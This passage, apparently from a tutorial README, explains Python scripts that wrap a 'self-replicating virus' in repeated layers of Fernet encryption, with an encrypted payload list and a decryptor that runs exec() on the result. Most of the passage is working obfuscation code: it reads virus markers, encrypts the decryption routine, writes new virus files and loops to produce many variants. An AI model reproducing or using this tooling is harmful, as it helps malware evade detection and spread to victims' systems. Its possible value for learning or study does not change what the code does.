q1_6_DKCzIhnAw__p9ZreJn7H7TKrTjy_eP5bO2kRWopLV2GaF-VfRPeWZPPhJsB6DYjSSQ_3Kny4KcNukY=',b'gAAAAABf2NGYN1akoPovYlprNiNUefA3Kw1uJQCLB0xlJJU1jXPmlHJAI8hIEVhCYdxRfH9q_GtZc50i6zh5PZrVP8KQM8xxsM4rtr9CCkH3RJyGxlmEZt9ZpocI8gch2OjzbBJn1Mgn',b'gAAAAABf2NGYEwANJ4-YehUGPaOToO_VAzmknnjSi4fnsvorq2u3B9GPCM1ESTQIVzUPEt-UWOcYd8odAve1RGha0LwoZOTpcd0-aTqGIUQhEr01sx63s2g=',b'gAAAAABf2NGYnBoflT7dvM2HgR-_WMJ8CMr4g8hu9MLgJU-ioUJneMoKlMs8iCgOAB_iwzHA16Bd5uV6vEsOISonK5c933Dmrw==']
decryption_encrypted_self_replicating_virus_encrypted = [b'gAAAAABf2cVaEh1gDoLzLA1pXD1_hlP61-dI60FYy0EErcGZYOCKpHxRkppTbfwMnpVI2j7bZTqMVvy-F6lq5qUOzub3rwv-yA==',b'gAAAAABf2cVasNCbGziSxhXSdf5kju5PGxtCzx6VogoIimybigzyDyaSIx3ccwxQtku_LrUydLnal_xHN5YKkUeSxhg8HcMNjMlj7bDNNfEag5rTgqhdTjNSB0yoDZwiFFOdMxfHQkzS',b'gAAAAABf2cVa1AmbtO_FK2thrt6Dt6NxwXc7HVV3KAsRALLDabUAaeWFtl6IpBD1UA_emfWiqZkPZM9Ealp96_AbjlSJLLUgDg==',b'gAAAAABf2cVasTBnohbon-IK9161SlWkoJZD5sCjLafmi_uRZUH1QeNfD9qqNa8p-ES5lw8wbuplt0bGCnro0fqOqJt_EVyoWN2cOpvC3VEtZ6rZABea37c=',b'gAAAAABf2cVaNa-LchScZBTpzIN7FN3Xg1WKKiTx3Fx92xoOPeoiSd2Kp4YnjxI_Rbq-xGfwK6aHLVen176tjsSv1f1MYas1hw==',b'gAAAAABf2cVaq2Mg3_YRnpm2uRiV3He658yfDP5zdZrCo_CDL9-8I_o5MrbznThn8K_z_zOvoKuCgSHJp501OJVLcP9U0I_BLIYFCRANL8apfreomlq3EYg=',b'gAAAAABf2cVaWYjg9RB0mBlYeYvhpP_U3lbZmuSeqGkykfF6yrYBEEtdZam2cdVsxkmHQWCaNhvDBN4Y12u_c7r92ME2xaY2EPIZYsm6yWBv2i-cpg-Wpi9huoIeOxp-eW2luvxRNc2QB6YNA1bzhDLI91G9BUTtrxX3pG3IQFFOyET1Kj3BNN0=',b'gAAAAABf2cVaNNcO33_YpWr6jo0G9nQfEmLEbu8hpZm6BN55rszsSLEPnExz-UQHNiHbR4Q7frZRdqVq8d9UovuDsDOMIUJhE_EAMUWYA8Rha3x-bqC5JCF9KbCsGtg5tkFoJAR8N6P9',b'gAAAAABf2cVaorZLT8h7DODduYG8zgJG_SlT_EMkAwkhfoIC8OIUWD-Dh5gMEx4oFldGmtqCH7ZJUhUBA2I3YJ6Yxd6ZHBrJj9JDbAz9x_nqx7VWHQKw6vSQ99DjCX_mwgyv5b3i9qOV5jguvthuqIK3jUHm3aQvIg==',b'gAAAAABf2cVan3cfAxWRddNldM1S-HykRgO79B14xacqgPSrWO3wXXrMKOmEMkmTRq468IFk1nhGOD6B2OdKSUM68GbJYDVVbQ==',b'gAAAAABf2cVaS7HN6bEdc2piHlFLR35C3Cw4yQLaV6lEuAXIX0VB-7XOyoGE9OG2wTbxFruOfIKwM0jZD1TpGw2y707DbeRhs3KbHRRO4jg8F5YB5058W2U=',b'gAAAAABf2cVaW--rQNAlweROLJHAbDCsIv3pKoNLxzqc8Dj-no45d4RVSBMcu2VvTtWYE6Nwr3AYfoH-pW3_iqbidmAY8lmfy1dU1aI4dXXKBZq1OzrqU8naxOsOEnHak1L4hHCJDrqN',b'gAAAAABf2cVa7Mks3vLwEEzIW5wuuRdA6__KoNrkgfH3XF264sttW4YAgi9tF_Iv9X_q3eHd2F1EmmeIpVgn4R7oN3r-xFyQWA==']
##### END ENCRYPT #####

from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'XqNcItZCraxZZQPZeZQeCWnOqx_MZcVmCdjK-IqIlhc=')
  for elem in decryption_encrypted_self_replicating_virus_encrypted:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))

###### END VIRUS ######

```

Now, we see that after `ancrypted_payload = [...]` there the `decryption_encrypted_self_replicating_virus_encrypted = [...]` list which is what the `decrypt_payload` function actually decrypts and execute.

Let's run through `encrypt_decryption.py`.

```py
import cryptography
from cryptography.fernet import Fernet

payload = []
encode = []
secret_key = b''
previous_payload = []
file_name = ""
```

Firstly the required `cryptography` module is imported and then some global variables are defined: The `payload` will contain the decryption method which will be encrypted, the `encode` will store the encrypted payload, the previous_payload will contain the code between the delimiters `### ENCRYPT ###` and `### END ENCRYPT ###` of the input file and the `file_name` will contain the filename of the input which is used to name the new list containing the new encrypted lines.

<hr>

```py
def ask_for_filename():
  global file_name
  print("Name of the file you want to encrypt the decryption method: ")
  file_name = input()
```

This function asks the user to type in the filename of the encrypted virus they want to employ and it stores the string into the global variable `file_name`.

<hr>

```py
def read_payload():
  with open(file_name, 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        if line == "###### END VIRUS ######\n":
          break
        payload.append(line)
      if "##### END ENCRYPT #####\n" == line:
        actual_payload = True


def read_encrypted_payload():
  with open(file_name, 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        if line == "##### END ENCRYPT #####\n":
          break
        previous_payload.append(line)
      if "##### ENCRYPT #####\n" == line:
        actual_payload = True
```

These read the decryption method between `### END ENCRYPT ###` and `### END VIRUS ###` and store it in `payload` and then read the 'old payload' between `### ENCRYPT ###` and `### END ENCRYPT ###` and store it in `previous_payload`.

<hr>

```py
def generate_key():
  global secret_key
  secret_key = Fernet.generate_key()


def encrypt_payload():
  fernet = Fernet(secret_key)
  for elem in payload:
    encode.append(fernet.encrypt(elem.encode()))
```

Here the secret key is generated and the `payload` is encrypted and stored in `encode`.

<hr>

```py
def ask_for_encrypted_filename():
  print("Name of the file with the encrypted virus: ")
  encypted_virus_filename = input()
  return encypted_virus_filename
```

This asks the user for the name of the new encrypted virus.

<hr>

```py
def compute_payloads():
  read_payload()
  generate_key()
  read_encrypted_payload()
  encrypt_payload()
```

This function just combines the previous ones, reading the payload, generating the key, reading the old payload and finally encrypting the payload.

<hr>

```py
def write_virus(encrypted_virus_name):
  with open(encrypted_virus_name, "w") as virus:
    virus.write("##### START VIRUS #####\n")
    virus.write('\n##### ENCRYPT #####\n')
    virus.writelines(previous_payload)
    virus.write("decryption_encrypted_" + file_name[:-3] +" = [b'" + (b"',b'".join(encode)).decode() + "']")
    virus.write("\n##### END ENCRYPT #####\n")
    decryption = """
from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'""" + secret_key.decode() + """')
  for elem in decryption_encrypted_""" + file_name[:-3] + """:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))
"""
    virus.write(decryption)
    virus.write("\n###### END VIRUS ######\n")
```

The core function, this will write the new encrypted virus. First it writes the previous payload, then it will add the encrypted lines stored in `encode` in a variable named `"decryption_encrypted_"+file_name[:-3]` and then it will add the new decryption function which decrypts the new payload and finally it executes it.

<hr>

```py
if __name__ == '__main__':
  ask_for_filename()
  compute_payloads()
  write_virus(ask_for_encrypted_filename())
```

The main function which runs the above functions if the module is run as a standalone.

### recursively_encrypt_decryption.py

This script is going to follow these steps:

1. Ask the level of encryption.
2. Ask the encrypted filename to encrypt.
3. Take the file, use the `encrypt_decryption.py` module to encrypt it and generate a file with the same name as the input but with `_e1` at the end.
4. Take this newly generated file, and apply to this the `encrypt_decryption.py` module and generate a new file with `_e2` at the end of the filename.
5. Repeat this process for a number of time equals to the level of encryption specified by the user.

<hr>

```py
import encrypt_decryption

number_of_encryption = 1
original_filename = ""
```

Import the module and define the global variables used in the program. The string `original_filename` will be used to generate the names for each output files.

<hr>

```py
def level_of_encryption():
  global number_of_encryption
  print("Number of encryption: ")
  number_of_encryption = input()


def ask_for_filename():
  global original_filename
  encrypt_decryption.ask_for_filename()
  original_filename = encrypt_decryption.file_name[:-3]
```

Ask for the level of encryption and the filename containing the encrypted virus. Since we are using the function `ask_for_filename()` of the module `encrypt_decryption.py`, the variable `file_name` of that module will be set (equal to the user input). Using this variable, the global `original_filename` will also be set.

<hr>

```py
def encrypt_loop():
  encrypted_filename = original_filename + "_e1"

  for i in range(1, int(number_of_encryption)+1):
    print(i)
    encrypt_decryption.compute_payloads()
    encrypt_decryption.write_virus(encrypted_filename + ".py")

    encrypt_decryption.file_name = encrypted_filename + ".py"
    encrypted_filename = original_filename + "_e" + str(i+1)

    encrypt_decryption.payload.clear()
    encrypt_decryption.encode.clear()
    encrypt_decryption.previous_payload.clear()
```

This defines the loop for generating all the new encrypted viruses. These are the steps it takes:

- Set the variable `encrypted_filename` with the `original filename + "_e1"`, this variable will store the name of the output of each iteration.

- Start the loop and run the function of the `encrypt_decryption.py` module, namely the `compute_payloads()` and the `write_virus(filename)`. The `compute_payloads()` will run using as input the `file_name` set in the function analyzed before (`ask_for_filename()`). The `write_virus` will generate a file, named after the string stored in `encrypted_filename`.

- Update the `file_name` in the module `encrypt_decryption.py` with the newly generated output file. This file, in fact, will be used as input for the next iteration.

- Update the `encrypted_filename` which will store the name for the next output file.

- Clear the content of the variable used in the module.

- Continue the loop for a number of time equal to the specified value.

## Bonus - Everything in one file

As for now, in order to run `recursively_encrypt_decryption.py` (and `encrypt_decryption.py`) we need to have the virus already encrypted. However, clearly, everything can be done in one single script.

Starting from the `self_replicating_virus.py`, the script `virus_recursive_encryption.py` will generate the first encrypted version of the file and then recursively encrypt the decryption functions.

In order for this to work, the virus needs to be in the form like `02-encryption/self_replicating_virus.py`, and also the `02-encryption/virus_encryption.py` module is required.

Run:

    py virus_recursive_encryption.py

and you will be prompted with:

    Name of the file you want to encrypt:

type the filename **without the extension**:

    self_replicating_virus

and then you will be asked for the level of encryption:

    Number of encryption:

and just put whatever you want:

    10

The script will generate the first encrypted version of the file as `self_replicating_virus_e0.py` and then:

    self_replicating_virus_e1.py
    self_replicating_virus_e2.py
    .
    .
    .
